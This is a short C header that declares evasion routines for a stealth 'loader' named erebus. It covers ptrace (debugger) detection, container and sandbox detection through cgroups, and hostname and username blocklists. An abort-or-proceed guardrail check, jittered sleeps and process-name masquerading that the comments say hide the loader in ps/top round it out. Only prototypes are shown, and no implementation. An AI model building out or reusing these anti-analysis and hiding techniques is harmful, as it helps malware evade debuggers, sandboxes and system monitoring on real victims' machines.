#pragma once

/* Returns 1 if being ptraced (TracerPid != 0 in /proc/self/status). */
int erebus_check_ptrace(void);

/* Returns 1 if running inside a container (docker/lxc/kubepods in cgroup). */
int erebus_check_cgroup(void);

/* Returns 1 if hostname contains any string in the blocklist. */
int erebus_check_hostname(const char **blocked, int count);

/* Returns 1 if $USER/$LOGNAME contains any string in the blocklist. */
int erebus_check_username(const char **blocked, int count);

/* Aggregate check - returns 1 = OK to proceed, 0 = abort.
 * Respects all CONFIG_CHECK_* compile-time guards. */
int erebus_guardrails_check(void);

/* nanosleep(base_ms + rand(0, jitter_ms)). */
void erebus_sleep_jitter(unsigned long base_ms, unsigned long jitter_ms);

/* prctl(PR_SET_NAME, name) - hides loader in ps/top. */
void erebus_masquerade_name(const char *name);
